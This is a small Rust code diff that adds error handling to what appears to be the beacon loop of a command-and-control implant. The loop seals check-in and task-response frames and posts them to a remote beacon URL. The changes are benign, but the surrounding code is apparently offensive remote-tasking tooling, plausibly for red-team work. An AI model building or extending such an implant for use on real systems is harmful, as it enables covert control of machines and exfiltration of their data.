@@ -72,7 +72,8 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     info.encode(&mut w)?;
     let info_plain = w.into_bytes();
     loop {
-        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
+        let frame = encode_frame(&pubkey, counter, &key, &info_plain)
+            .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
         counter += 1;
         match ureq::post(&beacon_url).send_bytes(&frame) {
             Ok(_) => break,
@@ -94,7 +95,8 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
             counter,
             &key,
             &TaskResponse::encode_vec(&pending_responses)?,
-        );
+        )
+        .map_err(|e| anyhow::anyhow!("failed to seal beacon frame: {e}"))?;
         counter += 1;
         pending_responses.clear();
 
@@ -156,7 +158,10 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         response,
                     }];
                     let frame =
-                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single)?);
+                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&single)?)
+                            .map_err(|e| {
+                            anyhow::anyhow!("failed to seal oversized-chunk frame: {e}")
+                        })?;
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                     }
@@ -182,7 +187,8 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         counter,
                         &key,
                         &TaskResponse::encode_vec(&pending_responses)?,
-                    );
+                    )
+                    .map_err(|e| anyhow::anyhow!("failed to seal batch-flush frame: {e}"))?;
                     if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (batch flush); response batch dropped");
                     }
